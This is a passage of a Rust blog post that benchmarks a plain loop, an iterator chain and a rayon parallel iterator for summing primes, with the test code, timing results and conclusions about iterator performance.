<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[cfg(test)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">mod</span><span class="token plain"> </span><span class="token module-declaration namespace" style="opacity:0.7">tests</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">use</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">super</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">use</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">test</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-results">Benchmarking results<a class="hash-link" aria-label="Direct link to Benchmarking results" title="Direct link to Benchmarking results" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#benchmarking-results">​</a></h2>
<p>Running the benchmark yields the following result:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum1 ... bench:  25,637,873.10 ns/iter (+/- 1,921,695.73)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum2 ... bench:  25,639,836.30 ns/iter (+/- 1,405,975.61)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OMG, what has happened???!!? Both approaches are equally performant. There seems to be no important difference between using a loop or iterator.</p>
<p><strong>That's our first result: It doesn't matter wether you use traditional loops or iterators. You can expect both to be similar fast.</strong></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="iterators-on-steroids">Iterators on steroids<a class="hash-link" aria-label="Direct link to Iterators on steroids" title="Direct link to Iterators on steroids" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#iterators-on-steroids">​</a></h2>
<p>Let's change out iterator based sum function a little bit: replacing <code>Iterator</code> by <code>ParallelIterator</code>, which is a trait from the <a href="https://crates.io/crates/rayon" target="_blank" rel="noopener noreferrer">rayon</a> crate. <em>rayon</em> allows you to do anything in parallel what you can do with normal iterators. So, if you have some code which is based on using iterators, you can simply switch to parallel iterators.</p>
<p>We add an additional sum function:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">ParallelIterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">s</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token number" style="color:#36acaa">100_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Be aware that the only difference to <code>sum2</code> is the trait <code>ParallelIterator</code>. No other code change is necessary.</p>
<p>Also, we need a benchmarking function:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">par_iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>As you can see, there is another difference: to create a <code>ParallelIterator</code>, we use the function <code>par_iter()</code> instead of <code>iter()</code>. So, you have the full control wether you want to use parallel iterators or not.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-parallel-iterators">Benchmarking parallel iterators<a class="hash-link" aria-label="Direct link to Benchmarking parallel iterators" title="Direct link to Benchmarking parallel iterators" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#benchmarking-parallel-iterators">​</a></h3>
<p>The benchmarking result (on a system with 4 virtual CPUs) is very informative:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum1 ... bench:  25,621,303.60 ns/iter (+/- 1,528,567.84)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum2 ... bench:  25,752,965.60 ns/iter (+/- 2,927,367.52)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum3 ... bench:  11,761,348.20 ns/iter (+/- 2,472,399.91)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can conclude:</p>
<ul>
<li>using the parallel iterator in our test case is significantly faster</li>
<li>migrating the code from traditional iterators to parallel iterators is simple</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#conclusion">​</a></h2>
<p>It doesn't matter if you use traditional loops or iterators. There will be no significant performance impact. But, if you want to be able to do significant changes, such as distributing loop iterations over multiple CPUs, without breaking your code, use iterators.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="one-more-thing">One more thing<a class="hash-link" aria-label="Direct link to One more thing" title="Direct link to One more thing" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#one-more-thing">​</a></h2>
<p>It is very important to implement you algorithm in the right way. But it is more important to understand the algorithm in detail, and to keep your implementation as neat to that as possible.</p>
<p>For example, let's change <code>sum1</code> by inserting a <code>break</code>:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum1</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> s </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token class-name">Ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100_000</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                s </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>and again benchmarking:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum1 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">603</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">891.70</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">742</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">577.75</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum2 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">899</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">039.20</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">916</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">178.50</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum3 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">899</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">570.60</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">477</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">771.27</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
